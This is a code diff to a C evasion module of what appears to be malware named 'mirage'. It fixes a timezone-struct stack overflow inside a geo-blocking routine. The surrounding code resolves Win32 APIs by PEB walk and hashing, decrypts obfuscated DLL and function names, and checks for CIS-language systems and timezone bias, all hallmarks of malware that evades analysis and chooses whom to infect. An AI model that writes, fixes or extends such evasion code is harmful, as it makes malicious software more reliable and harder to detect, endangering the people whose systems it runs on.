@@ -4,6 +4,37 @@
  * Direct translation of Zig src/evasion/detection.zig.
  * All Win32 API calls are resolved through PEB walk + hash.
  */
+#include <stdint.h>
+
+/* ── Full TIME_ZONE_INFORMATION (Windows SDK layout, 172 bytes) ── */
+typedef struct {
+    uint16_t wYear;
+    uint16_t wMonth;
+    uint16_t wDayOfWeek;
+    uint16_t wDay;
+    uint16_t wHour;
+    uint16_t wMinute;
+    uint16_t wSecond;
+    uint16_t wMilliseconds;
+} TZI_SYSTEMTIME;
+
+typedef struct {
+    int32_t        Bias;             /* +0   */
+    uint16_t       StandardName[32]; /* +4   (64 bytes) */
+    TZI_SYSTEMTIME StandardDate;     /* +68  (16 bytes) */
+    int32_t        StandardBias;     /* +84  */
+    uint16_t       DaylightName[32]; /* +88  (64 bytes) */
+    TZI_SYSTEMTIME DaylightDate;     /* +152 (16 bytes) */
+    int32_t        DaylightBias;     /* +168 */
+} TIME_ZONE_INFORMATION_FULL;
+
+_Static_assert(sizeof(TIME_ZONE_INFORMATION_FULL) == 172,
+               "TIME_ZONE_INFORMATION must be 172 bytes");
+
+/* Test hook: real TIME_ZONE_INFORMATION is 172 bytes */
+size_t mirage_tzi_struct_size(void) {
+    return sizeof(TIME_ZONE_INFORMATION_FULL);
+}
 
 #ifdef TEST_EVASION_STANDALONE
 /* Standalone test mode: expose pure logic functions only */
@@ -11,21 +42,6 @@
 #include "detection.h"
 #include "config.h"
 #include <string.h>
-#include <stdint.h>
-
-/* Test hook (Phase 4): size of the struct passed to GetTimeZoneInformation.
- * The real Windows TIME_ZONE_INFORMATION is 172 bytes; the LITE decl used
- * at the call site was 132 — kernel wrote 40 bytes past it (stack overflow). */
-size_t mirage_tzi_struct_size(void);
-
-size_t mirage_tzi_struct_size(void) {
-    typedef struct {
-        int32_t Bias;
-        uint16_t StandardName[32];
-        /* mirrors the LITE decl used at the call site (pre-fix) */
-    } TIME_ZONE_INFORMATION_LITE_TEST;
-    return sizeof(TIME_ZONE_INFORMATION_LITE_TEST);
-}
 
 int is_cis_language(uint16_t lang_id) {
     uint16_t primary = lang_id & 0x3FF;
@@ -219,19 +235,14 @@ mirage_geo_result mirage_check_geo_block(void) {
     char dll2[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll2);
     void* kernel32 = load_module(dll2);
     if (kernel32) {
-        /* GetTimeZoneInformation */
-        typedef struct {
-            int32_t Bias;
-            WCHAR StandardName[32];
-            /* SYSTEMTIME omitted for brevity — we only need Bias */
-        } TIME_ZONE_INFORMATION_LITE;
-
-        typedef int (*fn_GetTimeZoneInformation)(TIME_ZONE_INFORMATION_LITE*);
+        /* GetTimeZoneInformation — full 172-byte struct; the old LITE decl
+         * was 132 bytes and the kernel wrote 40 bytes past it. */
+        typedef int (*fn_GetTimeZoneInformation)(TIME_ZONE_INFORMATION_FULL*);
         char fn2[32]; enc_decrypt(enc_GetTimeZoneInformation, ENC_GETTIMEZONEINFORMATION_LEN, fn2);
         fn_GetTimeZoneInformation pGetTzi =
             (fn_GetTimeZoneInformation)resolve_func(kernel32, fn2);
         if (pGetTzi) {
-            TIME_ZONE_INFORMATION_LITE tzi;
+            TIME_ZONE_INFORMATION_FULL tzi;
             memset(&tzi, 0, sizeof(tzi));
             pGetTzi(&tzi);
             int bias_hours = -(tzi.Bias / 60);
